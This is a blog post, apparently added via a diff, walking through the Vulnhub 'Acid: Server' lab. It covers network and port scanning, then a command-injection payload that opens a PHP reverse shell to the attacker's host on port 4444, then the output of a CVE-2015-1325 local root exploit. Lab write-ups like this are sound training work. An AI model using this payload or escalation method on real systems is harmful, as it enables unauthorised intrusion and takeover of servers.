@@ -1,0 +1,473 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>[Vulnhub]Acid: Server - F4l13n5n0w</title>
+  <meta name="author" content="F4l13n5n0w">
+
+  
+  <meta name="description" content="Acid:Server is created by Avinash Kumar Thapa More information and OVA file download please check here. Links watch video online: Attacker &amp; &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://f4l13n5n0w.github.io/blog/2015/09/03/vulnhub-acid-server/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="F4l13n5n0w" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">F4l13n5n0w</a></h1>
+  
+    <h2>Security & Pen testing learning notes &#8211; F4l13n5n0w</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="f4l13n5n0w.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+
+  <li><a href="/">段子 | Blogging</a></li>
+  <li><a href="/reading">藏♥品 | Reading</a><li>
+  <li><a href="/about">玩意儿 | Coding</a><li>
+
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">[Vulnhub]Acid: Server</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-09-03T19:36:37+10:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2015</span></span> <span class='time'>7:36 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Acid:Server is created by <a href="https://twitter.com/@m_avinash143">Avinash Kumar Thapa</a></p>
+
+<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/acid-server,125/">here</a>.</p>
+
+<h2>Links</h2>
+
+<p>watch video online:</p>
+
+<iframe src='http://player.vimeo.com/video/138178348?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>
+
+
+<!-- more -->
+
+
+<h2>Attacker &amp; Target</h2>
+
+<p>Attacker: Kali Linux (<em>10.1.1.130/24</em>)</p>
+
+<p>Target: Acid: Server (<em>10.1.1.132/24</em>)</p>
+
+<h2>Vulnerability &amp; Exploit</h2>
+
+<ul>
+<li>Hints stored in some pages&#8217; source code or title, otherwise dirbuster/wfuzz can be used to find hidden folders</li>
+<li>Command injection vulnerability exists in <code>/Challenge/Magic_Box/command.php</code>, exploit it can obtain a reverse shell</li>
+<li>Apport/Ubuntu - Local Root Race Condition exploit (CVE-2015-1325) exist, exploit it to get ROOT</li>
+</ul>
+
+
+<h2>Method</h2>
+
+<ul>
+<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
+<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">unicornscan</font> &amp; <font color="FF8000">nmap</font>]</li>
+<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
+<li>Brute force scan to find hidden path [<font color="FF8000">dirbuster</font>]</li>
+<li>Found the hidden folder and a page which has command injection vulnerability, analyse it with burp suite and exploit it to get a reverse shell</li>
+<li>Enumeration and found the server is vulnerable to CVE-2015-1325, exploit it to get ROOT</li>
+</ul>
+
+
+<h2>Tools</h2>
+
+<p>All the tools used here can be found in Kali Linux</p>
+
+<ul>
+<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
+<li><a href="https://github.com/dneufeld/unicornscan">unicornscan</a></li>
+<li><a href="https://nmap.org/">nmap</a></li>
+<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
+<li><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a></li>
+<li><a href="https://portswigger.net/burp/">burp suite</a></li>
+</ul>
+
+
+<h2>Walkthrough</h2>
+
+<p>Using arp-scan as routine to detect the target&rsquo;s IP address (10.1.1.132 in this case).</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# arp-scan -l
+</span><span class='line'>Interface: eth0, datalink type: EN10MB (Ethernet)
+</span><span class='line'>Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
+</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
+</span><span class='line'>10.1.1.2  00:50:56:fd:d1:6b   VMware, Inc.
+</span><span class='line'>10.1.1.132    00:0c:29:36:7b:18   VMware, Inc.
+</span><span class='line'>10.1.1.254    00:50:56:fb:ea:26   VMware, Inc.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>10.1.1.132 is our Target!</p>
+
+<p>Then run uniscornscan to detect opening ports on the target (unicornscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# us -H -msf -p 1-65535 -Iv -T4 10.1.1.132
+</span><span class='line'>adding 10.1.1.132/32 mode `TCPscan' ports `1-65535' pps 300
+</span><span class='line'>using interface(s) eth0
+</span><span class='line'>scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
+</span><span class='line'>connected 10.1.1.130:14028 -> 10.1.1.132:33447
+</span><span class='line'>TCP open 10.1.1.132:33447  ttl 64
+</span><span class='line'>sender statistics 291.2 pps with 65535 packets sent total
+</span><span class='line'>listener statistics 131074 packets recieved 0 packets droped and 0 interface drops
+</span><span class='line'>TCP open           unknown[33447]     from 10.1.1.132  ttl 64</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From the result above, TCP port 33447 has been discovered.</p>
+
+<p>Then I run NMAP scan to probe more detail information against the opening port.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Host is up (0.00029s latency).
+</span><span class='line'>PORT      STATE SERVICE VERSION
+</span><span class='line'>33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
+</span><span class='line'>|_http-methods: GET HEAD POST OPTIONS
+</span><span class='line'>|_http-server-header: Apache/2.4.10 (Ubuntu)
+</span><span class='line'>|_http-title: /Challenge
+</span><span class='line'>MAC Address: 00:0C:29:36:7B:18 (VMware)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I found that apache 2.4.10 is running on port 33447, and the server OS is Ubuntu Linux.</p>
+
+<p>Then I start up the firefox to have a close look the web application and found hidden path from title or dirbuster scan or decode the password on the bottom of source code.</p>
+
+<p>The hidden folder is <code>/Challenge</code></p>
+
+<p>Then I keep using <code>dirbuster</code> to <code>/Challenge/</code> folder and found some pages, one of them is <code>cake.php</code> which again, the title give us the clue to another hidden folder <code>/Magic_Box</code></p>
+
+<p>Keep running <code>dirbuster</code> to <code>/Challenge/Magic_Box</code> folder and found interesting php page <code>command.php</code> which has command injection vulnerability</p>
+
+<p>Then by using <code>burp proxy</code> and tamper the request to exploit command injection vulnerability to get a shell, due to there is no <code>wget</code> in the target server, I use the following php command:</p>
+
+<p>payload (the payload need to be <font color="red">URL encoded</font>):</p>
+
+<p><code>127.0.0.1; php -r '$sock=fsockopen("10.1.1.130",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></p>
+
+<p>Setting up <code>NC</code> to listen on port 4444, then send the payload to server and got a reverse shell with <code>www-data</code> limited privilege.</p>
+
+<p>Then running some enumeration and poking around, I found the target server is Ubuntu 15.04, which is local privilege escape vulnerable to <code>CVE-2015-1325</code></p>
+
+<p>Compile and send the exploit to target server, then run it to get ROOT!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@acid:/tmp$ ./37088
+</span><span class='line'>./37088
+</span><span class='line'>created /var/crash/_bin_sleep.33.crash
+</span><span class='line'>crasher: my pid is 2571
+</span><span class='line'>apport stopped, pid = 2572
+</span><span class='line'>getting pid 2571
+</span><span class='line'>current pid = 2570..5000..7500..10000..12500..15000..17500..20000..22500..25000..27500..30000..32500..2500..
+</span><span class='line'>** child: current pid = 2571
+</span><span class='line'>** child: executing /bin/su
+</span><span class='line'>Password: sleeping 2s..
+</span><span class='line'>
+</span><span class='line'>checker: mode 4516
+</span><span class='line'>waiting for file to be unlinked..writing to fifo
+</span><span class='line'>fifo written.. wait...
+</span><span class='line'>waiting for /etc/sudoers.d/core to appear..
+</span><span class='line'>success
+</span><span class='line'># id
+</span><span class='line'>id
+</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
+</span><span class='line'># python -c 'import pty; pty.spawn("/bin/bash")'
+</span><span class='line'>python -c 'import pty; pty.spawn("/bin/bash")'
+</span><span class='line'>  ____                            _         _       _   _                 
+</span><span class='line'> / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
+</span><span class='line'>| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
+</span><span class='line'>| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
+</span><span class='line'> \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
+</span><span class='line'>                  |___/                                                   
+</span><span class='line'>root@acid:/tmp# cd /root
+</span><span class='line'>cd /root
+</span><span class='line'>root@acid:~# ls
+</span><span class='line'>ls
+</span><span class='line'>flag.txt
+</span><span class='line'>root@acid:~# cat flag.txt
+</span><span class='line'>cat flag.txt
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Dear Hax0r,
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>You have successfully completed the challenge.
+</span><span class='line'>
+</span><span class='line'>I  hope you like it.
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>FLAG NAME: "Acid@Makke@Hax0r"
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Kind & Best Regards
+</span><span class='line'>
+</span><span class='line'>-ACID
+</span><span class='line'>facebook: https://facebook.com/m.avinash143
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>root@acid:~#</span></code></pre></td></tr></table></div></figure>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">F4l13n5n0w</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-09-03T19:36:37+10:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2015</span></span> <span class='time'>7:36 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/acid/'>acid</a>, <a class='category' href='/blog/categories/command-injection/'>command injection</a>, <a class='category' href='/blog/categories/cve-2015-1325/'>cve-2015-1325</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  
+  
+    <div class="fb-like" data-send="true" data-width="450" data-show-faces="false"></div>
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/08/18/vulnhub-nullbyte-1/" title="Previous Post: [Vulnhub]NullByte: 1">&laquo; [Vulnhub]NullByte: 1</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Previous Blog</h1>
+  <p><a href='http://fallensnow-jack.blogspot.com/'>http://fallensnow-jack.blogspot.com/</a></p>
+  <h1>About Me</h1>
+  <p>On the way to be a hacker</p>
+  <ul id="certifications">
+    <li class="post">
+      <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional"><img src="/downloads/oscp-1.png" alt="Offensive Security Certified Professional" /></a>
+    </li>
+  </ul>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/09/03/vulnhub-acid-server/">[Vulnhub]Acid: Server</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/08/18/vulnhub-nullbyte-1/">[Vulnhub]NullByte: 1</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/07/17/vulnhub-hell-1/">[Vulnhub]Hell: 1</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/07/07/vulnhub-sokar-1/">[Vulnhub]Sokar: 1</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/06/24/vulnhub-tr0ll-2/">[Vulnhub]Tr0ll: 2</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+<section>
+  <h1>Tag Cloud</h1>
+    <span id="tag-cloud"><a href='/blog/categories/acid' style='font-size: 106.66666666666667%'>acid(1)</a> <a href='/blog/categories/axis2' style='font-size: 106.66666666666667%'>axis2(1)</a> <a href='/blog/categories/bash-bag' style='font-size: 106.66666666666667%'>bash bag(1)</a> <a href='/blog/categories/bof' style='font-size: 113.33333333333333%'>bof(2)</a> <a href='/blog/categories/command-injection' style='font-size: 106.66666666666667%'>command injection(1)</a> <a href='/blog/categories/commands-injection' style='font-size: 106.66666666666667%'>commands injection(1)</a> <a href='/blog/categories/cve-2015-1325' style='font-size: 106.66666666666667%'>cve-2015-1325(1)</a> <a href='/blog/categories/freshly' style='font-size: 106.66666666666667%'>freshly(1)</a> <a href='/blog/categories/hell' style='font-size: 106.66666666666667%'>hell(1)</a> <a href='/blog/categories/kioptrix2014' style='font-size: 106.66666666666667%'>kioptrix2014(1)</a> <a href='/blog/categories/knock-knock' style='font-size: 106.66666666666667%'>knock-knock(1)</a> <a href='/blog/categories/ldap-injection' style='font-size: 106.66666666666667%'>ldap injection(1)</a> <a href='/blog/categories/lfi' style='font-size: 106.66666666666667%'>lfi(1)</a> <a href='/blog/categories/mysql-injection' style='font-size: 106.66666666666667%'>mysql injection(1)</a> <a href='/blog/categories/nullbyte' style='font-size: 106.66666666666667%'>nullbyte(1)</a> <a href='/blog/categories/oscp' style='font-size: 106.66666666666667%'>oscp(1)</a> <a href='/blog/categories/pentesterlab' style='font-size: 160.0%'>pentesterlab(9)</a> <a href='/blog/categories/php-lfi' style='font-size: 106.66666666666667%'>php lfi(1)</a> <a href='/blog/categories/play-framework' style='font-size: 106.66666666666667%'>play framework(1)</a> <a href='/blog/categories/post-exploitation' style='font-size: 106.66666666666667%'>post exploitation(1)</a> <a href='/blog/categories/pwk' style='font-size: 106.66666666666667%'>pwk(1)</a> <a href='/blog/categories/session-injection' style='font-size: 106.66666666666667%'>session injection(1)</a> <a href='/blog/categories/shellshock' style='font-size: 113.33333333333333%'>shellshock(2)</a> <a href='/blog/categories/sokar' style='font-size: 106.66666666666667%'>sokar(1)</a> <a href='/blog/categories/sql-injection' style='font-size: 120.0%'>sql injection(3)</a> <a href='/blog/categories/sticky-bit' style='font-size: 113.33333333333333%'>sticky bit(2)</a> <a href='/blog/categories/tomcat' style='font-size: 106.66666666666667%'>tomcat(1)</a> <a href='/blog/categories/tophatsec' style='font-size: 106.66666666666667%'>tophatsec(1)</a> <a href='/blog/categories/tr0ll' style='font-size: 106.66666666666667%'>tr0ll(1)</a> <a href='/blog/categories/upload-bypass' style='font-size: 106.66666666666667%'>upload bypass(1)</a> <a href='/blog/categories/vulnhub' style='font-size: 153.33333333333334%'>vulnhub(8)</a> <a href='/blog/categories/web-for-pentester' style='font-size: 120.0%'>web for pentester(3)</a> <a href='/blog/categories/xml-injection' style='font-size: 106.66666666666667%'>xml injection(1)</a> <a href='/blog/categories/xss' style='font-size: 113.33333333333333%'>xss(2)</a> </span>
+</section>
+<section>
+  <h1>Categories</h1>
+    <ul id="category-list"><li><a href='/blog/categories/acid/'>acid (1)</a></li><li><a href='/blog/categories/axis2/'>axis2 (1)</a></li><li><a href='/blog/categories/bash-bag/'>bash bag (1)</a></li><li><a href='/blog/categories/bof/'>bof (2)</a></li><li><a href='/blog/categories/command-injection/'>command injection (1)</a></li><li><a href='/blog/categories/commands-injection/'>commands injection (1)</a></li><li><a href='/blog/categories/cve-2015-1325/'>cve-2015-1325 (1)</a></li><li><a href='/blog/categories/freshly/'>freshly (1)</a></li><li><a href='/blog/categories/hell/'>hell (1)</a></li><li><a href='/blog/categories/kioptrix2014/'>kioptrix2014 (1)</a></li><li><a href='/blog/categories/knock-knock/'>knock-knock (1)</a></li><li><a href='/blog/categories/ldap-injection/'>ldap injection (1)</a></li><li><a href='/blog/categories/lfi/'>lfi (1)</a></li><li><a href='/blog/categories/mysql-injection/'>mysql injection (1)</a></li><li><a href='/blog/categories/nullbyte/'>nullbyte (1)</a></li><li><a href='/blog/categories/oscp/'>oscp (1)</a></li><li><a href='/blog/categories/pentesterlab/'>pentesterlab (9)</a></li><li><a href='/blog/categories/php-lfi/'>php lfi (1)</a></li><li><a href='/blog/categories/play-framework/'>play framework (1)</a></li><li><a href='/blog/categories/post-exploitation/'>post exploitation (1)</a></li><li><a href='/blog/categories/pwk/'>pwk (1)</a></li><li><a href='/blog/categories/session-injection/'>session injection (1)</a></li><li><a href='/blog/categories/shellshock/'>shellshock (2)</a></li><li><a href='/blog/categories/sokar/'>sokar (1)</a></li><li><a href='/blog/categories/sql-injection/'>sql injection (3)</a></li><li><a href='/blog/categories/sticky-bit/'>sticky bit (2)</a></li><li><a href='/blog/categories/tomcat/'>tomcat (1)</a></li><li><a href='/blog/categories/tophatsec/'>tophatsec (1)</a></li><li><a href='/blog/categories/tr0ll/'>tr0ll (1)</a></li><li><a href='/blog/categories/upload-bypass/'>upload bypass (1)</a></li><li><a href='/blog/categories/vulnhub/'>vulnhub (8)</a></li><li><a href='/blog/categories/web-for-pentester/'>web for pentester (3)</a></li><li><a href='/blog/categories/xml-injection/'>xml injection (1)</a></li><li><a href='/blog/categories/xss/'>xss (2)</a></li></ul>
+</section>
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - F4l13n5n0w -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) {return;}
+  js = d.createElement(s); js.id = id; js.async = true;
+  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+
+
+
+
+
+
+</body>
+</html>
